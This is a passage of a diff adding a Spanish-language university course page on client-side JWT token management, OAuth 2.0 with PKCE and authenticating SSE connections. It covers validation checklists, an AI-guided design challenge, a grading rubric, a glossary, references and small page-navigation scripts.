+                        Reporte de validación: tabla con los 6 casos de prueba, el resultado obtenido por tu TokenManager y si coincide con el resultado esperado. Para cada caso que falló inicialmente: descripción del bug encontrado, causa raíz y fix aplicado. Mínimo 1 bug identificado y corregido (si tu implementación es perfecta desde el primer intento, la IA probablemente generó el código por ti — revisa si puedes explicar cada línea).
+                    </div>
+                </div>
+            </div>
+
+            <div class="checklist-box">
+                <h4>✅ Checklist de Validación Final</h4>
+                <div class="checklist-item">
+                    <span class="check-icon">🔐</span>
+                    <div>
+                        <strong>decode_payload() maneja tokens malformados</strong> — Casos 3 y 4 lanzan excepciones controladas, no IndexError/KeyError sin capturar.
+                        <div class="diagnostico">Si falla: agrega validación de len(parts) == 3 antes de acceder a parts[1].</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⏱️</span>
+                    <div>
+                        <strong>is_expiring_soon() usa segundos Unix, no milisegundos</strong> — Caso 1 no da is_expiring_soon=True en el año 9999.
+                        <div class="diagnostico">Si falla: verifica que no estás usando Date.now() sin dividir entre 1000 en JS.</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">🔒</span>
+                    <div>
+                        <strong>Refresh singleton verificado</strong> — Caso 6 resulta en exactamente 1 petición real al servidor de refresh.
+                        <div class="diagnostico">Si falla: el lock/flag no está protegiendo correctamente la zona crítica.</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">🚪</span>
+                    <div>
+                        <strong>Logout limpia completamente el estado</strong> — Después de logout(), get_auth_header() no retorna un token anterior.
+                        <div class="diagnostico">Si falla: hay estado residual en variables no limpiadas en el método logout().</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">🔁</span>
+                    <div>
+                        <strong>El interceptor no genera loop infinito</strong> — Un 401 en el endpoint de refresh ejecuta logout(), no un nuevo refresh.
+                        <div class="diagnostico">Si falla: agrega una bandera o verifica la URL de la petición que generó el 401.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="invariantes-box">
+                <h4>🔒 Invariantes que no deben romperse — VALIDA</h4>
+                <ul>
+                    <li>Un token sin campo <code>exp</code> debe tratarse como <strong>expirado inmediatamente</strong> — no como "nunca expira". Es más seguro asumir expiración que asumir validez indefinida.</li>
+                    <li>El método <code>refresh_access_token()</code> debe ser idempotente desde el punto de vista del llamador: si ya hay un refresh en curso, el segundo llamador obtiene el mismo resultado sin hacer una petición adicional.</li>
+                    <li>Nunca atrapar excepciones de red genéricas y continuar silenciosamente durante el refresh — si hay un error de red al renovar el token, el cliente debe informar al usuario, no fingir que todo está bien.</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========== FASE 5: PROFUNDIZA ========== -->
+    <section id="profundiza" class="fase-section">
+        <div class="fase-header profundiza">
+            <div class="fase-icon">🚀</div>
+            <div class="fase-info">
+                <h2>PROFUNDIZA — OAuth 2.0 y la Frontera del Conocimiento</h2>
+                <div class="bloom-tag">🎓 Bloom: Crear · Sintetizar · Conectar con el ecosistema profesional</div>
+            </div>
+        </div>
+        <div class="fase-content">
+
+            <div class="objetivos-box">
+                <h4>🎯 Objetivos de esta fase</h4>
+                <ul>
+                    <li>Comprender el flujo OAuth 2.0 Authorization Code + PKCE desde la perspectiva del cliente — sin implementarlo completamente, sino identificando qué hace el cliente en cada paso.</li>
+                    <li>Conectar JWT con Token Rotation (refresh tokens de un solo uso) como extensión natural del patrón implementado.</li>
+                    <li>Anticipar cómo la autenticación impacta a los clientes SSE (Semana 7) y WebSocket (Semana 11) — conexiones persistentes que deben mantenerse autenticadas.</li>
+                </ul>
+            </div>
+
+            <div class="contenido-section">
+                <h3>OAuth 2.0 + PKCE — Cuando el cliente no maneja credenciales</h3>
+                <p>En el flujo que implementaste esta semana, tu cliente recibe directamente las credenciales del usuario (email/password) y las envía al servidor de auth. Esto funciona cuando <strong>tu cliente es la aplicación que controlas</strong>. Pero, ¿qué pasa cuando EcoMarket quiere permitir que sus operadores se autentiquen con su cuenta de Google o Microsoft, sin que tu cliente vea su contraseña?</p>
+                <p>OAuth 2.0 Authorization Code con PKCE (Proof Key for Code Exchange) resuelve exactamente ese problema. El cliente <strong>nunca ve la contraseña del usuario</strong> — delega la autenticación al proveedor de identidad (Google, Microsoft, el propio servidor de auth de EcoMarket).</p>
+            </div>
+
+            <div class="ascii-diagram" role="img" aria-label="Diagrama de secuencia: flujo OAuth 2.0 Authorization Code con PKCE visto desde el cliente. Muestra los 4 pasos que realiza el cliente: generar code_verifier y code_challenge, redirigir al servidor de autorización, recibir el authorization code temporal en la URL de callback, e intercambiarlo por access_token y refresh_token. La descripción textual aparece en el párrafo siguiente.">
+
+ Tu Cliente Panel EcoMarket          Auth Server             Proveedor ID (Google)
+ ─────────────────────────────────────────────────────────────────────────────────
+
+ 1. GENERA code_verifier (aleatorio, 43-128 chars)
+    code_challenge = BASE64URL(SHA256(code_verifier))
+    [El cliente guarda code_verifier en memoria]
+
+ 2. Redirige al navegador/abre ventana:
+    GET /oauth/authorize
+      ?response_type=code
+      &client_id=panel-ecomarket
+      &code_challenge=Qn3...
+      &code_challenge_method=S256
+      &redirect_uri=https://panel.ecomarket.mx/callback
+      &scope=read:inventario read:precios
+                                    ─────────────────────────────────────────────►
+                                    (El usuario se autentica con Google — el cliente no ve la contraseña)
+                                    ◄─────────────────────────────────────────────
+                                    Redirige a redirect_uri?code=AUTH_CODE_TEMPORAL
+
+ 3. Cliente recibe AUTH_CODE_TEMPORAL en la URL de callback
+    [Este código dura ~60 segundos — el cliente debe canjearlo inmediatamente]
+
+    POST /oauth/token
+    Body: {
+      grant_type: "authorization_code",
+      code: AUTH_CODE_TEMPORAL,
+      code_verifier: [el que guardaste en paso 1],  ← PKCE proof
+      redirect_uri: "https://panel.ecomarket.mx/callback"
+    }
+                                    ─────────────────────────────────────────────►
+                                    ◄─────────────────────────────────────────────
+                                    {access_token, refresh_token, expires_in}
+
+ 4. [TokenManager almacena — exactamente igual que esta semana]
+
+PKCE protege contra: interceptación del AUTH_CODE por otra aplicación en el mismo dispositivo.
+Si alguien roba el código pero no tiene el code_verifier → no puede canjearlo.
+            </div>
+            <div class="diagrama-descripcion">
+                <strong>Qué representa:</strong> el flujo OAuth 2.0 Authorization Code + PKCE visto exclusivamente desde lo que hace el código del cliente en cada paso. <strong>Simplifica:</strong> omite los detalles del servidor de auth, la validación del code_verifier en el servidor y los errores de OAuth. <strong>Aspecto clave:</strong> después del paso 4, el cliente tiene un access_token y refresh_token — exactamente iguales a los de esta semana. El <code>TokenManager</code> que construiste funciona sin cambios para OAuth 2.0.
+            </div>
+
+            <div class="context-box purple">
+                <div class="box-title">🔄 Token Rotation — la extensión natural del Reto 3</div>
+                <p>En la implementación de esta semana, el <code>refresh_token</code> puede usarse múltiples veces durante sus 7 días de vida. Algunos servidores implementan <strong>Token Rotation</strong>: cada vez que el cliente usa el refresh_token para obtener un nuevo access_token, el servidor devuelve también un <strong>nuevo refresh_token</strong> e invalida el anterior.</p>
+                <p style="margin-top: 0.8rem;">Ventaja: si alguien roba el refresh_token, el servidor lo detecta cuando el cliente legítimo intenta usarlo (el servidor verá dos intentos con el mismo token). Desventaja: si el cliente no guarda el nuevo refresh_token antes de que falle la conexión, el usuario queda sin poder renovar — debe re-autenticarse. Tu <code>TokenManager</code> necesitaría actualizar <em>ambos</em> tokens en el método <code>refresh_access_token()</code>.</p>
+            </div>
+
+            <div class="context-box info">
+                <div class="box-title">🔮 Conexión con Semana 9 y Semana 11 — autenticación en conexiones persistentes</div>
+                <p>Tu cliente SSE de la Semana 7 abre una conexión HTTP persistente. Si el access_token (15 min) expira mientras esa conexión está activa, ¿qué pasa? El servidor puede cerrar la conexión con 401, o puede seguir enviando eventos (si la autenticación fue solo al abrir). Esta semana 9 explorará resiliencia; la Semana 11 (WebSocket) tendrá el mismo problema pero con handshake diferente.</p>
+                <p style="margin-top: 0.8rem;"><strong>Preview:</strong> una solución es pasar el token como query parameter al abrir la conexión SSE/WebSocket (<code>?token=eyJ...</code>), con las implicaciones de seguridad que eso trae (el token queda en los logs del servidor). La alternativa es una cookie HttpOnly — que el navegador adjunta automáticamente a la petición de upgrade del WebSocket.</p>
+            </div>
+
+            <!-- RETO 7 -->
+            <div class="reto-ia">
+                <div class="reto-ia-header">
+                    <span class="reto-numero">7</span>
+                    <h4>Diseña la estrategia de auth para la conexión SSE de la Semana 7 <span class="reto-badge avanzado">Avanzado</span></h4>
+                </div>
+                <div class="reto-ia-body">
+                    <div class="rol-ia"><strong>🤖 Rol de la IA:</strong> Arquitecto de sistemas distribuidos que plantea el problema de autenticar conexiones persistentes — sin resolver todo de inmediato.</div>
+                    <div class="prompt-box">Actúa como arquitecto especialista en comunicación cliente-servidor persistente.
+
+Tengo dos componentes ya implementados:
+- ClienteSSEMultiplex (Semana 7): conecta a /api/ecomarket/eventos, mantiene conexión persistente.
+- TokenManager (Semana 8): gestiona access_token con duración de 15 minutos.
+
+El problema: cuando el access_token expira a los 15 minutos, la conexión SSE sigue activa. El servidor puede:
+- Opción A: Ignorar la expiración y seguir enviando eventos (sin re-autenticación en la conexión).
+- Opción B: Cerrar la conexión con un evento especial o 401, forzando al cliente a reconectar con token nuevo.
+
+Guíame en este análisis, uno por uno, esperando mi respuesta:
+
+1. ANÁLISIS DE OPCIONES: ¿Cuáles son las implicaciones de seguridad de la Opción A vs la Opción B desde la perspectiva del CLIENTE? ¿Cuál prefiere el cliente por simplicidad? ¿Cuál prefiere el equipo de seguridad?
+   → Dame tu análisis primero, yo lo complemento.
+
+2. MECANISMO DE AUTH AL ABRIR SSE: Tengo tres opciones para pasar el token al abrir la conexión:
+   a) Header Authorization (EventSource del browser NO soporta headers personalizados)
+   b) Query parameter (?token=eyJ...) — simple pero el token queda en logs
+   c) Cookie HttpOnly enviada automáticamente por el navegador
+   → ¿Qué opción usarías para la Ruta Browser? ¿Y para la Ruta Python (donde EventSource no aplica)?
+
+3. DISEÑO DEL CLIENTE: Si el servidor elige la Opción B (cierra en expiración), ¿cómo integras el TokenManager con el ClienteSSEMultiplex de Semana 7 para que:
+   - El cliente detecte el cierre por expiración (¿cómo distinguirlo de un cierre por error de red?)
+   - Haga refresh del token antes de reconectar
+   - Reconecte con el nuevo token automáticamente
+   Propón el flujo en pseudocódigo — yo lo intento implementar.</div>
+                    <div class="entregable-box">
+                        Documento de diseño (no necesariamente código): diagrama de flujo o pseudocódigo que muestre cómo tu ClienteSSEMultiplex de Semana 7 integra el TokenManager de Semana 8 para manejar la expiración del token durante una conexión SSE activa. Incluye: el mecanismo elegido para pasar el token al abrir la conexión, y el flujo de reconexión autenticada.
+                    </div>
+                </div>
+            </div>
+
+            <div class="context-box tip">
+                <div class="box-title">💡 Preguntas abiertas para explorar (más allá del curso)</div>
+                <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                    <li>¿Cómo maneja el cliente un JWT con múltiples audiences (<code>aud</code>)? ¿Debe el cliente validar que el audience coincide con el servicio que está consumiendo?</li>
+                    <li>¿Qué es un JWK Set (JWKS) y por qué algunos clientes lo usan para obtener las claves públicas del servidor — aunque el cliente nunca verifique la firma directamente en la mayoría de los casos?</li>
+                    <li>¿Cómo funciona la autenticación mTLS (mutual TLS) cuando <em>ambos</em> lados — cliente y servidor — presentan certificados? ¿En qué contextos reemplaza a los JWT?</li>
+                    <li>¿Qué es el Paso de Tokens en arquitecturas de microservicios (<em>token passthrough</em> vs <em>token exchange</em>)? ¿Cuándo el cliente reusa el mismo token para múltiples servicios y cuándo obtiene tokens específicos por servicio?</li>
+                </ul>
+            </div>
+
+            <div class="invariantes-box">
+                <h4>🔒 Invariantes que no deben romperse — PROFUNDIZA</h4>
+                <ul>
+                    <li>El flujo OAuth 2.0 con PKCE <strong>no cambia el contrato del TokenManager</strong> — después del intercambio de código, el cliente obtiene access_token y refresh_token exactamente iguales. La diferencia es <em>cómo</em> se obtienen, no <em>qué</em> se hace con ellos.</li>
+                    <li>PKCE <strong>no es opcional</strong> en clientes públicos (SPAs, apps móviles). Sin PKCE, el authorization code puede ser interceptado por otras aplicaciones en el mismo dispositivo y canjeado antes que el cliente legítimo.</li>
+                    <li>Pasar el access_token como query parameter (<code>?token=...</code>) <strong>deja el token en logs de servidor, historial de navegador y referer headers</strong>. Es un anti-patrón que debe evitarse salvo cuando no hay otra opción técnica (como en EventSource del browser).</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========== EVALUACIÓN ========== -->
+    <section id="evaluacion" class="evaluacion-section">
+        <div class="evaluacion-header">
+            <h2>📊 Sistema de Evaluación — Semana 8</h2>
+            <p style="opacity: 0.9; margin-top: 0.5rem;">Alineado al ciclo AETL · Énfasis en razonamiento y toma de decisiones</p>
+        </div>
+        <div class="criterio-item">
+            <span class="fase-badge">COMPRENDE</span>
+            <div>
+                <strong>Función decode_payload()</strong> — Decodifica correctamente payload Base64URL, maneja casos malformados (sin exp, 2 partes, payload no-JSON) con excepciones controladas. Comentario explicando por qué el cliente puede leer el payload sin verificar la firma.
+            </div>
+            <span class="puntos">25 pts</span>
+        </div>
+        <div class="criterio-item">
+            <span class="fase-badge">APLICA</span>
+            <div>
+                <strong>TokenManager completo</strong> — Todos los métodos implementados (decode_payload, is_expiring_soon, store_tokens, get_auth_header, refresh_access_token con singleton, logout). Interceptor HTTP adjunta token y maneja 401 con reintento una sola vez. Script de demostración ejecutable.
+            </div>
+            <span class="puntos">35 pts</span>
+        </div>
+        <div class="criterio-item">
+            <span class="fase-badge">REFLEXIONA</span>
+            <div>
+                <strong>Documento de decisiones</strong> — Justificación de almacenamiento (con referencia a XSS/CSRF concretos), margen de refresh elegido con argumento de seguridad, descripción del mecanismo singleton implementado y comportamiento ante refresh fallido.
+            </div>
+            <span class="puntos">20 pts</span>
+        </div>
+        <div class="criterio-item">
+            <span class="fase-badge">VALIDA</span>
+            <div>
+                <strong>Reporte de validación</strong> — Tabla con resultados de los 6 casos de prueba. Al menos 1 bug documentado con causa raíz y fix. Verificación del singleton con contador de peticiones reales.
+            </div>
+            <span class="puntos">20 pts</span>
+        </div>
+        <div class="criterio-item">
+            <span class="fase-badge">PROFUNDIZA</span>
+            <div>
+                <strong>Diseño de integración SSE + Auth (Reto 7)</strong> — Diagrama o pseudocódigo del flujo de reconexión autenticada. Se evalúa la justificación del mecanismo de paso de token elegido para la conexión SSE. Opcional pero suma crédito adicional.
+            </div>
+            <span class="puntos">+10 pts extra</span>
+        </div>
+        <div style="padding: 1rem 1.5rem; background: #f8f9fa; border-top: 2px solid #e0e0e0;">
+            <p><strong>Criterio de entrega mínima:</strong> TokenManager con al menos <code>decode_payload()</code>, <code>is_expiring_soon()</code> y <code>get_auth_header()</code> implementados correctamente, con el reporte de validación de los Casos 1–3.</p>
+            <p style="margin-top: 0.8rem;"><strong>⚠️ Condición Zero Tolerance:</strong> El TokenManager <strong>nunca</strong> debe implementar verificación de firma JWT en el cliente (HMAC, RSA u otro algoritmo de firma). Si el entregable incluye dicho código — independientemente de qué otras partes estén correctas — <strong>el entregable completo de la semana se anula</strong> y requiere reentrega. Esta condición es consistente con el principio establecido en todas las semanas del curso: una decisión de arquitectura incorrecta invalida el trabajo, sin importar la cantidad de código correcto que lo acompañe.</p>
+        </div>
+    </section>
+
+    <!-- ========== GLOSARIO ========== -->
+    <section id="glosario" class="glosario-section">
+        <div class="glosario-header">
+            <h2>📖 Glosario — Semana 8</h2>
+        </div>
+        <div class="glosario-grid">
+            <dl class="termino-card">
+                <dt>JWT (JSON Web Token)</dt>
+                <dd>Estándar (RFC 7519) para transmitir claims entre partes como un objeto JSON firmado digitalmente. Compuesto por header.payload.signature codificados en Base64URL.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>Access Token</dt>
+                <dd>Token de corta duración (típicamente 15–60 min) que el cliente adjunta a cada petición autenticada. Su brevedad limita el daño si es interceptado.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>Refresh Token</dt>
+                <dd>Token de larga duración (días o semanas) que el cliente usa exclusivamente para obtener un nuevo access_token sin re-autenticarse con credenciales.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>Claim</dt>
+                <dd>Par clave-valor en el payload del JWT. Claims registrados por RFC 7519: <code>sub</code>, <code>iss</code>, <code>aud</code>, <code>exp</code>, <code>iat</code>, <code>nbf</code>, <code>jti</code>.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>Base64URL</dt>
+                <dd>Variante de Base64 que usa <code>-</code> en lugar de <code>+</code>, <code>_</code> en lugar de <code>/</code> y omite el padding <code>=</code>. Segura para URLs y headers HTTP.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>Bearer Token</dt>
+                <dd>Esquema de autenticación HTTP donde el token se envía en el header <code>Authorization: Bearer &lt;token&gt;</code>. "Bearer" significa "quien porta este token tiene acceso".</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>Token Rotation</dt>
+                <dd>Estrategia donde cada uso del refresh_token genera un nuevo refresh_token e invalida el anterior, detectando uso doble del mismo token (posible robo).</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>XSS (Cross-Site Scripting)</dt>
+                <dd>Ataque donde un script malicioso se ejecuta en el contexto del navegador de la víctima. Puede leer localStorage y variables JS expuestas.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>CSRF (Cross-Site Request Forgery)</dt>
+                <dd>Ataque donde una página maliciosa hace que el navegador de la víctima envíe una petición autenticada sin su conocimiento — aprovechando las cookies que el navegador adjunta automáticamente.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>HttpOnly Cookie</dt>
+                <dd>Cookie con el flag <code>HttpOnly</code>: el navegador la envía automáticamente en peticiones HTTP pero el JavaScript de la página no puede leerla, eliminando el vector XSS.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>PKCE (Proof Key for Code Exchange)</dt>
+                <dd>Extensión de OAuth 2.0 (RFC 7636) donde el cliente genera un code_verifier secreto y envía su hash (code_challenge) al servidor. Protege el authorization code contra interceptación.</dd>
+            </dl>
+            <dl class="termino-card">
+                <dt>Clock Skew</dt>
+                <dd>Diferencia de tiempo entre el reloj del cliente y el del servidor. Afecta el cálculo de expiración del token. Se mitiga con márgenes de refresh generosos y tratando 401 como fuente de verdad definitiva.</dd>
+            </dl>
+            <dl class="termino-card aetl">
+                <dt>Refresh Singleton (AETL)</dt>
+                <dd>Patrón de implementación cliente donde solo una petición de refresh puede estar activa simultáneamente. Las demás peticiones concurrentes esperan el resultado de la primera en lugar de disparar peticiones adicionales.</dd>
+            </dl>
+            <dl class="termino-card aetl">
+                <dt>Refresh Proactivo vs Reactivo (AETL)</dt>
+                <dd>Proactivo: el cliente anticipa la expiración leyendo el claim exp y renueva el token antes de que expire. Reactivo: el cliente espera el 401 del servidor para iniciar el refresh. El proactivo ofrece mejor experiencia de usuario.</dd>
+            </dl>
+            <dl class="termino-card aetl">
+                <dt>Token Manager (AETL)</dt>
+                <dd>Componente cliente responsable del ciclo de vida completo de los tokens: almacenamiento, lectura de claims, refresh proactivo/reactivo, singleton de refresh y logout limpio. Abstracción que el interceptor HTTP usa sin conocer los detalles del JWT.</dd>
+            </dl>
+        </div>
+    </section>
+
+    <!-- ========== REFERENCIAS ========== -->
+    <section id="referencias" class="referencias-section">
+        <h3>📚 Referencias</h3>
+
+        <p style="color: var(--primary); font-weight: bold; margin-bottom: 1rem;">Constructos Pedagógicos</p>
+        <div class="referencia-item">Anderson, L. W., et al. (2001). <em>A Taxonomy for Learning, Teaching, and Assessing: A Revision of Bloom's Taxonomy of Educational Objectives.</em> Longman.</div>
+        <div class="referencia-item">Bandura, A. (2001). Social cognitive theory: An agentic perspective. <em>Annual Review of Psychology, 52</em>, 1–26.</div>
+        <div class="referencia-item">Bognár, L. (2024). Constructivism and AI-mediated learning environments. <em>Journal of Educational Technology, 41</em>(2), 112–128.</div>
+        <div class="referencia-item">Brod, G., et al. (2023). Shared agency in human-AI collaborative learning. <em>Computers in Human Behavior, 138</em>, 107458.</div>
+        <div class="referencia-item">Chiu, T. K. F. (2024). Self-regulated learning in AI-enhanced educational contexts. <em>British Journal of Educational Technology, 55</em>(1), 43–61.</div>
+        <div class="referencia-item">Mahdi, A., et al. (2025). Cognitive load and AI tutoring systems: Implications for technical education. <em>Educational Psychology Review, 37</em>, 89–115.</div>
+        <div class="referencia-item">Sari, D., et al. (2025). Self-regulation strategies in programming education mediated by generative AI. <em>Computers & Education, 198</em>, 104981.</div>
+        <div class="referencia-item">Sweller, J. (1988). Cognitive load during problem solving: Effects on learning. <em>Cognitive Science, 12</em>, 257–285.</div>
+        <div class="referencia-item">Vygotsky, L. S. (1978). <em>Mind in Society: The Development of Higher Psychological Processes.</em> Harvard University Press.</div>
+        <div class="referencia-item">Zimmerman, B. J. (2000). Self-efficacy: An essential motive to learn. <em>Contemporary Educational Psychology, 25</em>(1), 82–91.</div>
+
+        <p style="color: var(--primary); font-weight: bold; margin: 1.5rem 0 1rem;">Estándares y Especificaciones Técnicas</p>
+        <div class="referencia-item">Jones, M., Bradley, J., Sakimura, N. (2015). <em>RFC 7519: JSON Web Token (JWT).</em> Internet Engineering Task Force. https://datatracker.ietf.org/doc/html/rfc7519</div>
+        <div class="referencia-item">Jones, M., Hardt, D. (2012). <em>RFC 6750: The OAuth 2.0 Authorization Framework: Bearer Token Usage.</em> IETF. https://datatracker.ietf.org/doc/html/rfc6750</div>
+        <div class="referencia-item">Hardt, D. (2012). <em>RFC 6749: The OAuth 2.0 Authorization Framework.</em> IETF. https://datatracker.ietf.org/doc/html/rfc6749</div>
+        <div class="referencia-item">Sakimura, N., et al. (2019). <em>RFC 7636: Proof Key for Code Exchange by OAuth Public Clients.</em> IETF. https://datatracker.ietf.org/doc/html/rfc7636</div>
+        <div class="referencia-item">Jones, M., et al. (2015). <em>RFC 7517: JSON Web Key (JWK).</em> IETF. https://datatracker.ietf.org/doc/html/rfc7517</div>
+
+        <p style="color: var(--primary); font-weight: bold; margin: 1.5rem 0 1rem;">Literatura de Referencia</p>
+        <div class="referencia-item">Nygard, M. T. (2018). <em>Release It! Design and Deploy Production-Ready Software</em> (2nd ed.). Pragmatic Bookshelf. [Capítulo sobre tokens y seguridad en clientes distribuidos]</div>
+        <div class="referencia-item">ACM, IEEE-CS, & AAAI. (2024). <em>Computer Science Curricula 2023 (CS2023).</em> DOI: 10.1145/3664191</div>
+    </section>
+
+</main>
+
+<!-- ========== FOOTER ========== -->
+<footer class="footer">
+    <div class="modelo-badge">AETL — Aprendizaje Técnico Aumentado por IA</div>
+    <p>Semana 8 · Unidad III: Seguridad del Cliente · JWT y Gestión de Tokens</p>
+    <p style="opacity: 0.7; margin-top: 0.5rem; font-size: 0.9rem;">
+        Programación Distribuida del Lado del Cliente · Licenciatura en Sistemas Computacionales · UAN
+    </p>
+    <p style="opacity: 0.5; margin-top: 0.5rem; font-size: 0.8rem;">
+        Constructivismo · SRL · Carga Cognitiva · Agencia Compartida · Bloom para la Era Digital
+    </p>
+</footer>
+
+<script>
+// ── Tab switching para rutas Python / Browser ──────────────────────
+// Cada botón de tab tiene onclick="showRuta('grupo', 'id')" — el grupo
+// delimita qué contenidos y botones afecta, evitando colisiones entre
+// el starter code de APLICA y los tabs del Reto 5 de REFLEXIONA.
+function showRuta(grupo, id) {
+    // Ocultar todos los contenidos del grupo
+    document.querySelectorAll('[data-ruta-grupo="' + grupo + '"]').forEach(el => {
+        el.classList.remove('active');
+    });
+    // Quitar active de todos los tabs del grupo
+    document.querySelectorAll('[data-tab-grupo="' + grupo + '"]').forEach(el => {
+        el.classList.remove('active');
+    });
+    // Mostrar el contenido elegido
+    const target = document.getElementById(id);
+    if (target) target.classList.add('active');
+    // Marcar el botón activo (el que tiene onclick con este id)
+    document.querySelectorAll('[data-tab-grupo="' + grupo + '"][data-tab-id="' + id + '"]').forEach(el => {
+        el.classList.add('active');
+    });
+}
+
+// ── Progress bar — marca la fase visible ──────────────────────────
+const phases = ['comprende', 'aplica', 'reflexiona', 'valida', 'profundiza'];
+const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+        if (entry.isIntersecting) {
+            const id = entry.target.id;
+            document.querySelectorAll('.progress-step').forEach(s => s.classList.remove('active', 'completed'));
+            const idx = phases.indexOf(id);
+            phases.forEach((p, i) => {
+                const el = document.querySelector(`.progress-step[href="#${p}"]`);
+                if (!el) return;
+                if (i < idx) el.classList.add('completed');
+                else if (i === idx) el.classList.add('active');
+            });
+        }
+    });
+}, { threshold: 0.2 });
+
+phases.forEach(p => {
+    const el = document.getElementById(p);
+    if (el) observer.observe(el);
+});
+</script>
+</body>
+</html>
